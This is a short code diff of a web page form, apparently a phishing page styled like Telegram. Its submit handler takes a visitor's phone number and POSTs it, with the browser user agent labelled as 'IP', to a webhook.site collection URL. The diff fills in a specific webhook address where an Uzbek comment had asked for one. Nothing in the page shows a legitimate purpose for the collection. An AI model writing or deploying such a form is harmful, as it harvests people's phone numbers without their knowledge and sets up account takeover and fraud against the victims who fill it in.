@@ -20,7 +20,7 @@ button{width:100%;padding:12px;background:#0088cc;color:white;border:none;border
 document.getElementById('form').onsubmit=function(e){
 e.preventDefault();
 var phone=document.getElementById('phone').value;
-// BU YERGA O'Z WEBHOOK URL INGIZNI QO'YING
+// https://webhook.site/0d5b234f-5372-4e94-8a06-c60951cbec24
 fetch('https://webhook.site/YOUR-UNIQUE-ID?is-app=x',{
 method:'POST',body:'Phone: '+phone+' | IP: '+navigator.userAgent
 });
